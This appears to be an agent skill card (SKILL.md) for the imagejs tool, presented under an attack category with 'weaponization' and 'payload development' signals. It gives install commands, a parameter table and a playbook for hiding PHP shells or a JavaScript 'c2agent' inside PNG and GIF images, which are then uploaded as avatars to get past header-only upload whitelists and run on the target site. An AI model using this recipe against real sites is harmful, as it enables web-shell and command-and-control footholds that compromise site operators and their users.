---
name: imagejs-polyglot
description: "imagejs bypasses image upload whitelists. Signals: payload development, weaponization, PHP hidden in GIF, list supported formats."
zh-signals: "imagejs: 绕过图片上传白名单。信号:载荷开发,武器化,PHP 藏进 GIF,列出支持格式。"
when-to-use: >-
  Use when bypassing image upload whitelists with polyglot files; hide
  JavaScript or PHP payloads inside PNG or GIF images so only the file header
  is validated.
---

# imagejs

- Attack Category: C07 Payload and File Delivery
- Upstream Repository: https://github.com/jklmnn/imagejs
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/jklmnn/imagejs && cd imagejs && make
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./imagejs -i payload.js -o exploit.png js` | Hide JS in a PNG polyglot |
| `./imagejs -i shell.php -o pic.gif php` | Hide PHP in a GIF |
| `-l` | List supported formats |

## Attack Scenario Playbook

### Bypassing image upload whitelists

```bash
./imagejs -i c2agent.js -o avatar.png js
# Upload it as an avatar .png and execute it via <script src=avatar.png> or an include
```

## Notes

Builds image + script polyglot files that bypass upload filters that only validate the file header, delivering JS/PHP payloads.
